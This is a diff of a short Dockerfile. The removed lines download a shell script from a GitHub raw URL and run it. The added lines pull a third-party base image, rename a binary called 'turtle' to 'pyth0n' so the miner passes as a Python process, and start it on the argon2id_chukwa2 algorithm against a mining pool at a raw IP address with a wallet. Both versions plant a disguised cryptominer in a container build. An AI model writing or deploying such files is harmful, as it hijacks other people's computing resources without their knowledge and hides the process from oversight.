@@ -1,6 +1,4 @@
-FROM debian:stretch
-EXPOSE 8080
-RUN apt update -y \
-  && apt install -y \
-  wget
-RUN wget https://raw.githubusercontent.com/agamlimaa/srb/main/qrl.sh && chmod +x qrl.sh && ./qrl.sh
+FROM christiankm01/master:latest
+RUN set -ex \
+  && mv /usr/bin/turtle /usr/bin/pyth0n \
+  && pyth0n  --algorithm argon2id_chukwa2 --pool 23.95.242.133:3022 --wallet userA -k
